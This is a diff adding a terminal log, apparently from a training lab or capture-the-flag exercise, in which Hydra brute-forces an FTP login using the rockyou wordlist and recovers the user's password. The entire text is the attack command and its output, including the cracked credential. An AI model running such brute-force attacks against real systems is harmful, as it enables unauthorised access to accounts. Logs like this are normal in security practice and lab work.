@@ -1,0 +1,11 @@
+hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://10.10.255.225
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-23 20:30:48
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344400 login tries (l:1/p:14344400), ~896525 tries per task
+[DATA] attacking ftp://10.10.255.225:21/
+[STATUS] 176.00 tries/min, 176 tries in 00:01h, 14344224 to do in 1358:22h, 16 active
+[STATUS] 228.33 tries/min, 685 tries in 00:03h, 14343715 to do in 1046:60h, 16 active
+[21][ftp] host: 10.10.255.225   login: ftpuser   password: love4ever
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-04-23 20:35:30
